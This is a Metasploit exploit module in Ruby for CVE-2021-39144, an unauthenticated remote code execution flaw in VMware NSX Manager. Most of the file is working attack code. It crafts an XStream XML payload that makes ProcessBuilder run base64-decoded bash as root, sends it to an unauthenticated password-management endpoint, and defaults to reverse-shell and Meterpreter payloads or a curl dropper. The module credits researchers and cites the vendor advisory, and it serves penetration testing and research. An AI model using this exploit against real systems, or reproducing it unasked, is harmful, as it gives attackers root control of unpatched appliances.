##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware NSX Manager XStream unauthenticated RCE',
        'Description' => %q{
          VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.
          VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8.
          Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V),
          a malicious actor can get remote code execution in the context of 'root' on the appliance.
          VMware Cloud Foundation 3.x and more specific NSX Manager Data Center for vSphere up to and including version 6.4.13
          are vulnerable to Remote Command Injection.
 
          This module exploits the vulnerability to upload and execute payloads gaining root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y', # metasploit module author
          'Sina Kheirkhah', # Security researcher (Source Incite)
          'Steven Seeley' # Security researcher (Source Incite)
        ],
        'References' => [
          ['CVE', '2021-39144'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2022-0027.html'],
          ['URL', 'https://kb.vmware.com/s/article/89809'],
          ['URL', 'https://srcincite.io/blog/2022/10/25/eat-what-you-kill-pre-authenticated-rce-in-vmware-nsx-manager.html'],
          ['URL', 'https://attackerkb.com/topics/ngprN6bu76/cve-2021-39144']
        ],
        'DisclosureDate' => '2022-10-25',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :in_memory,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'curl', 'printf' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end
 
  def check_nsx_v_mgr
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login.jsp')
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end
 
  def execute_command(cmd, _opts = {})
    b64 = Rex::Text.encode_base64(cmd)
    random_uri = rand_text_alphanumeric(4..10)
    xml_payload = <<~XML
      <sorted-set>
        <string>foo</string>
        <dynamic-proxy>
          <interface>java.lang.Comparable</interface>
          <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
              <command>
                <string>bash</string>
                <string>-c</string>
                <string>echo #{b64} &#x7c; base64 -d &#x7c; bash</string>
              </command>
            </target>
            <action>start</action>
          </handler>
        </dynamic-proxy>
      </sorted-set>
    XML
 
    return send_request_cgi({
      'method' => 'PUT',
      'ctype' => 'application/xml',
      'uri' => normalize_uri(target_uri.path, 'api', '2.0', 'services', 'usermgmt', 'password', random_uri),
      'data' => xml_payload
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end
 
  # Checking if the target is potential vulnerable checking the http title "VMware Appliance Management"
  # that indicates the target is running VMware NSX Manager (NSX-V)
  # All NSX Manager (NSX-V) unpatched versions, except for 6.4.14, are vulnerable
  def check
    print_status("Checking if #{peer} can be exploited.")
    res = check_nsx_v_mgr
    return CheckCode::Unknown('No response received from the target!') unless res
 
    html = res.get_html_document
    html_title = html.at('title')
    if html_title.nil? || html_title.text != 'VMware Appliance Management'
      return CheckCode::Safe('Target is not running VMware NSX Manager (NSX-V).')
    end
 
    CheckCode::Appears('Target is running VMware NSX Manager (NSX-V).')
  end
 
  def exploit
    case target['Type']
    when :in_memory
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager
    end
  end
end